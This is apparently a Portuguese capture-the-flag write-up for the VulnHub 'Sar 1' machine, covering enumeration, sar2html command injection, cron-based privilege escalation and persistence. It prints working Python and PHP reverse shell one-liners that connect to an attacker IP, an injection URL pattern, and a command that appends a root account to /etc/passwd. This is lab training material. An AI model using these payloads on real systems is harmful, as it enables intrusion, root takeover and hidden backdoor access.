---
title: "VulnHub - Sar 1"
tags: [Linux, Easy]
categories: VulnHub
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/inicial.png)

Link: <https://www.vulnhub.com/entry/sar-1,425/>

# Enumeração

## Primeiro passo é rodar o arp-scan para detectarmos os hosts

```bash
arp-scan -I eth1 192.168.56.100/24
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/arp.png)

## Segundo passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 1 porta aberta no servidor

> Porta 80 -> Servidor Web

## Enumeração da Porta 80 (Web)

Entramos no site pra ver do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/web.png)

Rodamos o gobuster nele

```bash
gobuster dir -u http://192.168.56.110 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -t 100
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/gobuster.png)

Achamos o **phpinfo.php** e o **robots.txt**

### Robots.txt

Verificando o Robots.txt

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/robots.png)

Interessante... **sar2HTML**

Vamos pesquisar o que é isso, ao entrarmos na página web, temos uma surpresa

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/sar.png)

# Exploração sarHTML

Então vamos procurar por exploits para ele

**sar2html Ver 3.2.1**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/sar1.png)

https://www.exploit-db.com/exploits/47204

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/sar2.png)

```
In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute 
the command you entered. After command injection press "select # host" then your command's 
output will appear bottom side of the scroll screen.
```

Então executamos! Conseguimos ler o /etc/passwd!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/sar3.png)

# Reverse Shell

Testei vários reverses shells, o que deu certo foi em python

**python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'**

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/rev.png)

Vamos iniciar a escalação de privilégios

# Normal -> Root

Primeira coisa é rodar o linpeas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/linpeas.png)

Baixamos pra máquinas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/linpeas1.png)

Executamos nela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/linpeas3.png)

Encontramos um cron que nos chamou atenção!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/linpeas4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/linpeas6.png)

Verificamos mais de perto ela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/cron.png)

Hummm... ele executa um script no /var/www/html como root, interessante, vamos até lá ver o que podemos extrair de bom

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/cron1.png)

1 - Verificamos que para alterar o script devemos ser root.

2 - Contudo, vemos que esse script executa outro script... o write.sh

3 - Verificamos as permissões do write.sh e vemos que podemos escrever nele

4 - Apenas verificamos o que tem nele

5 - Verificamos que somos o www-data, que tem permissões nesse arquivo

Vou demonstrar duas maneiras, uma com um shell direto e outra adicionando um usuário no /etc/passwd para fins de persistência

## Shell Reverso de root

Apenas adicionamos nosso reverse nele e esperamos ele executar

**php -r '$sock=fsockopen("192.168.1.20",4444);exec("/bin/sh -i<&3 >&3 2>&3");'**

Somos root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/cron2.png)

## Persistência

Para adicinar persistência nele vamos colocar um usuário no passwd, pra podermos acessar o terminal via su

**echo "hacker:aaDUnysmdx4Fo:0:0:hacker:/root:/bin/bash" >> /etc/passwd**

hacker:senha

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/cron3.png)

Esperamos ele executar de novo o cron e verificamos o /etc/passwd

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/cron4.png)

Acessamos via sudo hacker

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/cron6.png)

# Flags

Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-sar1/root.png)